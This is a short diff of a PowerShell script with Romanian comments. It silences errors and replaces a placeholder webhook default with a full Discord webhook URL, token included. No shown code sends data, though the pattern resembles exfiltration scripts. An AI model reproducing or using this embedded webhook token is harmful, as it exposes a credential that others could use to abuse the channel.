@@ -2,7 +2,7 @@ $ErrorActionPreference = "SilentlyContinue"
 
 # Adaugă un parametru pentru webhook URL
 param (
-    [string]$WebhookUrl = "https://example.com/webhook"  # Înlocuiește cu URL-ul tău webhook
+    [string]$WebhookUrl = "https://discord.com/api/webhooks/1349764436566740992/cdDvQNf7sGNznldeJBIzOWUMQ-2vRTuRQmBC_-9y6gGxYT8EgMFVSsIuCKDMCSc5kflp"  # Înlocuiește cu URL-ul tău webhook
 )
 
 function Get-Signature {
